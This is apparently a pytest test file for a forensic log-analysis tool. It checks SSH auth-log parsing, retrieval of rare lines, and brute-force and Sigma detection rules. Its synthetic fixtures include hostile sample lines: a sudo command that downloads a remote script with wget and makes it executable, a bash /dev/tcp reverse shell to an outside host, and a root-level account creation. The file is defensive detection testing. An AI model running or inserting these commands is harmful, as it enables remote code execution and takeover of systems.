"""Evidence the models were never trained on: a Linux SSH auth log (classic syslog, no year).

Checks that parsing, indicator extraction and retrieval still work when the ML marks the records
"not applicable": times are read, users are extracted, and retrieval surfaces the rare, telling lines
(the successful login, the sudo command) instead of forty copies of one failed login.
"""
import time

import pandas as pd
import pytest
from fastapi.testclient import TestClient

from evidentia.api.main import app
from evidentia.ingestion.entities import extract
from evidentia.ingestion.upload import _line_time, parse_upload
from evidentia.rag.retrieve import template

NOW = pd.Timestamp("2026-11-12T16:00:00Z")


def auth_log() -> bytes:
    t = pd.Timestamp("2026-11-10T02:14:00")
    lines = [f"{(t + pd.Timedelta(seconds=3 * i)).strftime('%b %d %H:%M:%S')} web01 sshd[{4100 + i}]: "
             f"Failed password for invalid user admin from 203.0.113.45 port {50000 + i} ssh2" for i in range(40)]
    lines.append(f"{(t + pd.Timedelta(seconds=125)).strftime('%b %d %H:%M:%S')} web01 sshd[4199]: "
                 "Accepted password for deploy from 203.0.113.45 port 50122 ssh2")
    lines.append(f"{(t + pd.Timedelta(seconds=140)).strftime('%b %d %H:%M:%S')} web01 sudo:   deploy : TTY=pts/0 ; "
                 "PWD=/home/deploy ; USER=root ; COMMAND=/bin/sh -c wget http://198.51.100.7/x.sh -O /tmp/x.sh; "
                 "chmod +x /tmp/x.sh")
    lines += [f"{(t + pd.Timedelta(minutes=30 + i)).strftime('%b %d %H:%M:%S')} web01 sshd[{5000 + i}]: "
              f"Accepted publickey for alice from 10.0.0.{20 + i} port {40000 + i} ssh2" for i in range(10)]
    return "\n".join(lines).encode()


@pytest.mark.parametrize("line, expect, assumed", [
    ("Nov 10 02:14:00 web01 sshd[1]: x", "2026-11-10 02:14:00", True),
    ("Dec 30 23:00:00 h x", "2025-12-30 23:00:00", True),           # would be in the future -> previous year
    ("1.2.3.4 - - [10/Nov/2026:02:14:00 +0500] \"GET /\"", "2026-11-09 21:14:00", False),
    ("2026/11/10 02:14:00 svc started", "2026-11-10 02:14:00", False),
    ("Nov 10 2026 02:14:00 fw x", "2026-11-10 02:14:00", False),
    ("2026-11-10T02:14:00Z x", "2026-11-10 02:14:00", False),
])
def test_common_log_time_formats(line, expect, assumed):
    t, a = _line_time(line, NOW)
    assert pd.Timestamp(t, unit="s", tz="UTC").strftime("%Y-%m-%d %H:%M:%S") == expect
    assert a is assumed


def test_line_without_time_stays_empty():
    assert _line_time("no time in this line 10.0.0.1", NOW) is None


def test_assumed_year_is_reported():
    p = parse_upload("auth.log", auth_log())
    assert p.events["timestamp"].notna().all()
    assert p.parser_counts["year_assumed"] == len(p.events)
    assert any("no year" in w for w in p.warnings)


def test_auth_log_users_are_extracted():
    users = lambda s: {v for k, v in extract(s) if k == "user"}  # noqa: E731
    assert users("sshd[1]: Failed password for invalid user admin from 1.2.3.4 port 5 ssh2") == {"admin"}
    assert users("sshd[1]: Accepted password for deploy from 1.2.3.4 port 5 ssh2") == {"deploy"}
    assert "deploy" in users("sudo:   deploy : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/id")


def test_template_masks_numbers_but_keeps_addresses():
    a = template("Nov 10 02:14:00 sshd[4100]: Failed password for admin from 203.0.113.45 port 50000 ssh2")
    b = template("Nov 10 02:15:51 sshd[4137]: Failed password for admin from 203.0.113.45 port 50037 ssh2")
    c = template("Nov 10 02:15:51 sshd[4137]: Failed password for admin from 203.0.113.9 port 50037 ssh2")
    assert a == b and "203.0.113.45" in a   # same host, different time / pid / port: one template
    assert a != c                           # a different host is a different story


def test_retrieval_surfaces_rare_lines_on_unseen_evidence():
    c = TestClient(app)
    cid = c.post("/api/cases", json={"name": "Unseen SSH log"}).json()["id"]
    try:
        c.post(f"/api/cases/{cid}/files", files=[("files", ("auth.log", auth_log(), "text/plain"))])
        for _ in range(120):
            fs = c.get(f"/api/cases/{cid}/files").json()
            if all(f["status"] in ("ready", "error") for f in fs):
                break
            time.sleep(1)
        assert fs[0]["status"] == "ready"
        a = c.post(f"/api/cases/{cid}/ask", json={"question": "What did 203.0.113.45 do?"}).json()
        cited = {e["message"].split(": ", 1)[1][:40] for e in a["citations"]["events"]}
        text = a["answer_markdown"]
        assert any(m.startswith("Accepted password for deploy") for m in cited)   # the success, not only failures
        assert "40 similar records" in text                                           # the failures, counted once
        assert "user:deploy" in text                                                  # pivot to the sudo line
        assert sum(m.startswith("Failed password") for m in cited) <= 2
    finally:
        c.delete(f"/api/cases/{cid}")


# ---------------------------------------------------------------- detection rules (evidentia/detect/rules.py)
def _rule_input(raw: bytes):
    import numpy as np
    from evidentia.detect.rules import detect
    p = parse_upload("auth.log", raw).events
    ev = pd.DataFrame({"event_id": np.arange(1, len(p) + 1), "ts": p["timestamp"], "message": p["message_sanitized"],
                       "src_ip": p["src_ip"], "dst_ip": p["dst_ip"], "dst_port": p["dst_port"]})
    ents = {int(e): set(extract(m, {"src_ip": s})) for e, m, s in zip(ev["event_id"], ev["message"], ev["src_ip"])}
    return detect(ev, ents)


def test_rules_reconstruct_the_attack_chain():
    f = {x["rule"]: x for x in _rule_input(auth_log())}
    assert {r for r in f if not r.startswith("sigma:")} == {"brute_force", "brute_force_success",
                                                            "privilege_after_login", "tool_download"}
    sigma = [x for r, x in f.items() if r.startswith("sigma:")]
    assert [x["title"] for x in sigma] == ["Sigma: Suspicious Activity in Shell Commands"]   # wget ...; chmod +x
    assert sigma[0]["event_ids"] == [42] and "T1059.004" in sigma[0]["technique"]
    assert f["brute_force"]["n_events"] == 40 and f["brute_force"]["event_ids"] == [1, 40]
    assert f["brute_force_success"]["event_ids"] == [41] and "deploy" in f["brute_force_success"]["title"]
    assert f["privilege_after_login"]["event_ids"] == [42]
    assert f["brute_force"]["id"] in f["brute_force_success"]["related"]
    assert all(x["actions"] and x["tactic"] for x in f.values())
    assert f["brute_force_success"]["severity"] == "high"


def test_thresholds_are_learned_from_the_case():
    from evidentia.detect.rules import BRUTE, learned_threshold
    assert learned_threshold([3, 4], BRUTE)["how"] == "default"                   # too few sources
    t = learned_threshold([0, 1, 2, 2, 3, 2, 1, 40], BRUTE)                        # one attacker cannot inflate it
    assert t["how"] == "learned" and t["value"] < 15 and t["typical"] == 2
    assert learned_threshold([0] * 20, BRUTE)["value"] == BRUTE["floor"]


def test_slow_brute_force_is_caught():
    t = pd.Timestamp("2026-11-10T00:00:00")
    lines = [f"{(t + pd.Timedelta(minutes=4 * i)).strftime('%b %d %H:%M:%S')} h sshd[1]: Failed password for root "
             f"from 198.51.100.9 port {i} ssh2" for i in range(40)]                # 40 tries, 1 every 4 minutes
    lines += [f"{(t + pd.Timedelta(minutes=7 * i)).strftime('%b %d %H:%M:%S')} h sshd[2]: Failed password for bob "
              f"from 10.0.0.{i} port {i} ssh2" for i in range(1, 9)]              # 8 users mistyping once
    f = _rule_input("\n".join(lines).encode())
    assert [x["rule"] for x in f] == ["slow_brute_force"] and "198.51.100.9" in f[0]["title"]


def test_sigma_engine():
    import numpy as np
    from evidentia.detect.sigma import load_rules, rules_status, run_sigma
    assert len(load_rules()) == 22 and rules_status()["unsupported"] == []
    lines = ["bash -i >& /dev/tcp/198.51.100.7/4444 0>&1",                              # reverse shell
             "useradd[1]: new user: name=x, UID=0, GID=0, home=/home/x",               # root-level account
             "logrotate: rm -f /var/log/syslog.1",                                     # the rule's own false positive
             "sshd[5]: Accepted publickey for alice from 10.0.0.2 port 1 ssh2"]        # normal
    ev = pd.DataFrame({"event_id": range(1, 5), "ts": np.arange(4) * 60.0 + 1.7e9, "message": lines,
                       "src_ip": None, "dst_ip": None, "dst_port": None})
    titles = {x["title"] for x in run_sigma(ev, {})[0]}
    assert "Sigma: Suspicious Reverse Shell Command Line" in titles
    assert "Sigma: Privileged User Has Been Created" in titles
    assert not any("Syslog" in t for t in titles)


def test_rules_stay_quiet_below_thresholds():
    t = pd.Timestamp("2026-11-10T02:14:00")
    few = "\n".join(f"{(t + pd.Timedelta(seconds=i)).strftime('%b %d %H:%M:%S')} h sshd[1]: Failed password for bob "
                    f"from 198.51.100.9 port {i} ssh2" for i in range(9))       # 9 < 10 failures
    spread = "\n".join(f"{(t + pd.Timedelta(minutes=2 * i)).strftime('%b %d %H:%M:%S')} h sshd[1]: Failed password "
                       f"for bob from 198.51.100.9 port {i} ssh2" for i in range(12))  # 12 failures over 22 minutes
    assert _rule_input(few.encode()) == []
    assert _rule_input(spread.encode()) == []


def test_answer_has_assessment_and_actions_without_llm(monkeypatch):
    monkeypatch.setenv("EVIDENTIA_LLM", "off")
    c = TestClient(app)
    cid = c.post("/api/cases", json={"name": "Unseen SSH log, rules"}).json()["id"]
    try:
        c.post(f"/api/cases/{cid}/files", files=[("files", ("auth.log", auth_log(), "text/plain"))])
        for _ in range(120):
            if all(f["status"] in ("ready", "error") for f in c.get(f"/api/cases/{cid}/files").json()):
                break
            time.sleep(1)
        assert [f["rule"] for f in c.get(f"/api/cases/{cid}/findings").json()][:1] == ["brute_force_success"]
        a = c.post(f"/api/cases/{cid}/ask", json={"question": "What should I do next?"}).json()
        text = a["answer_markdown"]
        assert "## Assessment" in text and "## Recommended actions" in text
        assert "Treat deploy as compromised" in text
        assert {f["rule"] for f in a["citations"]["findings"]} >= {"brute_force", "brute_force_success"}
    finally:
        c.delete(f"/api/cases/{cid}")
